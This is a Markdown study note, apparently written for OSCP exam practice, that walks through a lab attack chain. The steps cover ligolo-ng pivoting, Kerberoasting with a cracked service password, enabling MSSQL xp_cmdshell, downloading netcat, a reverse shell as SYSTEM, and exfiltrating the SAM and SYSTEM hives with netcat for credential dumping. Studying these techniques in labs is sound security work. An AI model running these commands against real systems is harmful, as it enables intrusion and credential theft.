## pivotting technique<br>

1. Transfer the agent file to the machine hovering over both Network segments<br>
wget http://192.168.45.173/agent.exe -outfile agent.exe<br>

2. Start the ligolo server<br>
./proxy -selfcert -laddr 0.0.0.0:443<br>

3. Start the ligolo agent to connect to the server<br>
./agent.exe -connect 192.168.45.173:443 -ignore-cert

![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/1.png?raw=true)

4. By this time, you should be able to access the internal machine by pivotting through the macine.

![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/2.png?raw=true)

5. nmap the internal Ip address (We will focus on MSSQL in this example)

![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/3.png?raw=true)

7. You can try Kerberoasting since you have access to the DC.
`impacket-GetUserSPNs -request -dc-ip 10.10.138.146 oscp.exam/Eric.Wallows`

![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/4.png?raw=true)


8. Password crack the above hashes<br>
`hashcat -m 13100 kerberoas_hash /usr/share/wordlists/rockyou.txt`<br>
 sql_svc password  → Dolphin1


9. Access the MSSQL server
`impacket-mssqlclient sql_svc:Dolphin1@10.10.138.148 -windows-auth`
`EXEC sp_configure 'show advanced options', 1;`<br>
`RECONFIGURE;`<br>
`EXEC sp_configure 'xp_cmdshell', 1;`<br>
`RECONFIGURE;`<br>
`EXEC xp_cmdshell ' whoami '`<br>

![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/5.png?raw=true)


10. Set the Port forwardinf IP so that the internal machines can access Kali

`listener_add --addr 0.0.0.0:888 --to 0.0.0.0:888`<br>
`listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4444`<br>
`listener_add --addr 0.0.0.0:80 --to 0.0.0.0:80`<br>
`listener_add --addr 0.0.0.0:8000 --to 0.0.0.0:8000`<br>

![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/6.png?raw=true)


11. Check the internal segment ip of the machine

![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/7.png?raw=true)


12. Start the lightweight Web Server

![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/8.png?raw=true)



13. cmd download gave an error
`EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.138.147nc64.exe C:\Windows\Temp\nc64.exe';`<br>


14. powershell download worked
`EXEC xp_cmdshell 'powershell -Command "(New-Object Net.WebClient).DownloadFile(''http://10.10.138.147/nc64.exe'',''C:\Users\Public\nc64.exe'')"';`


15. Let's try reverse and got a shell as system
`EXEC xp_cmdshell 'C:\Users\Public\nc64.exe 10.10.138.147 4444 -e powershell'`
`nc -lvnp 4444`

![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/9.png?raw=true)


16. Obtain SAM and SYSTEM 

`C:\windows.old\windows\system32>nc64.exe 10.10.149.138 5555 < SAM`
`C:\windows.old\windows\system32>.\nc64.exe 10.10.149.138 5555 < SYSTEM`

16. Listen on the port to receive them

`nc -lvnp 5555 > SAM`
`nc -lvnp 5555 > SYSTEM`

17. Dump the creds 
`impacket-secretsdump -sam SAM -system SYSTEM LOCAL`

![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/11.png?raw=true)


# References
https://medium.com/@saintlafi/pivoting-and-tunneling-for-oscp-and-beyond-cheat-sheet-3435d1d6022
https://zenn.dev/megapachirisu/articles/bb0e9beb3f20ae
https://zenn.dev/codingotter/articles/79590426fecee5#chisel-dynamic-port-forwarding
https://medium.com/@Poiint/pivoting-with-ligolo-ng-0ca402abc3e9
https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16
